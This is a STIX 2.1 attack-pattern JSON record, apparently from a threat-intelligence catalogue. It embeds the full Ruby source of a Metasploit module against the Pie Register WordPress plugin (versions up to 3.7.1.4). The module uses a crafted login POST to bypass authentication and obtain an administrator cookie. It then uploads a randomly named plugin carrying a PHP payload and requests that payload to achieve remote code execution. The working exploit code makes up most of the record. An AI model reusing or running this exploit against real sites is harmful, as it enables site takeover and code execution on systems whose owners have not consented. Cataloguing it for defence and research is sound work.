{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed77e858-922b-45e4-845f-f8cd82a20aa8",
    "created": "2024-08-14T17:13:11.937074Z",
    "modified": "2024-08-14T17:13:11.937079Z",
    "name": "WordPress Plugin Pie Register Auth Bypass to RCE",
    "description": " This module uses an authentication bypass vulnerability in Wordpress Plugin Pie Register <= 3.7.1.4 to generate a valid cookie. With this cookie, hopefully of the admin, it will generate a plugin pack the payload into it and upload it to a server running WordPress.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_pie_register_bypass_rce.rb",
            "external_id": "wp_pie_register_bypass_rce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Plugin Pie Register Auth Bypass to RCE',\n        'Description' => %q{\n          This module uses an authentication bypass vulnerability in\n          Wordpress Plugin Pie Register <= 3.7.1.4 to generate a valid cookie.\n          With this cookie, hopefully of the admin, it will generate a plugin,\n          pack the payload into it and upload it to a server running WordPress.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # Metasploit module\n          'Lotfi13-DZ' # EDB\n        ],\n        'DisclosureDate' => '2021-10-08',\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [['WordPress', {}]],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['EDB', '50395']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('USERID', [true, 'User ID to take over', 1]),\n      ]\n    )\n  end\n\n  def check\n    return CheckCode::Safe('Wordpress not detected.') unless wordpress_and_online?\n\n    checkcode = check_plugin_version_from_readme('pie-register', '3.7.1.5')\n    if checkcode == CheckCode::Safe\n      print_error('Pie Register not a vulnerable version')\n    end\n    return checkcode\n  end\n\n  def get_cookie\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path),\n      'vars_post' => {\n        'user_id_social_site' => datastore['USERID'],\n        'social_site' => 'true',\n        'piereg_login_after_registration' => 'true',\n        '_wp_http_referer' => '/login/',\n        'log' => 'null',\n        'pwd' => 'null'\n      },\n      'keep_cookies' => true\n    })\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n\n    cookie_jar.cookies.each do |c|\n      print_status(\"Found cookie: #{c.name}=#{c.value}\")\n    end\n    res.get_cookies\n  end\n\n  # direct copy from modules/exploits/unix/webapp/wp_admin_shell_upload.rb\n  def generate_plugin(plugin_name, payload_name)\n    plugin_script = %(<?php\n/**\n * Plugin Name: #{plugin_name}\n * Version: #{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(2)}\n * Author: #{Rex::Text.rand_text_alpha(10)}\n * Author URI: http://#{Rex::Text.rand_text_alpha(10)}.com\n * License: GPL2\n */\n?>)\n\n    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    zip.add_file(\"#{plugin_name}/#{plugin_name}.php\", plugin_script)\n    zip.add_file(\"#{plugin_name}/#{payload_name}.php\", payload.encoded)\n    zip\n  end\n\n  def exploit\n    cookie_jar.clear # prevent issues between attempts\n    print_status('Bypassing Authentication')\n    cookie = get_cookie\n\n    print_status('Preparing payload...')\n    plugin_name = Rex::Text.rand_text_alpha(10)\n    payload_name = Rex::Text.rand_text_alpha(10).to_s\n    payload_uri = normalize_uri(wordpress_url_plugins, plugin_name, \"#{payload_name}.php\")\n    zip = generate_plugin(plugin_name, payload_name)\n\n    print_status('Uploading payload...')\n    uploaded = wordpress_upload_plugin(plugin_name, zip.pack, cookie)\n    fail_with(Failure::UnexpectedReply, 'Failed to upload the payload') unless uploaded\n\n    print_status(\"Executing the payload at #{payload_uri}...\")\n    register_files_for_cleanup(\"#{payload_name}.php\")\n    register_files_for_cleanup(\"#{plugin_name}.php\")\n    register_dir_for_cleanup(\"../#{plugin_name}\")\n    send_request_cgi({ 'uri' => payload_uri, 'method' => 'GET' }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-10-08",
    "x_mitre_platforms": [
        "php'"
    ]
}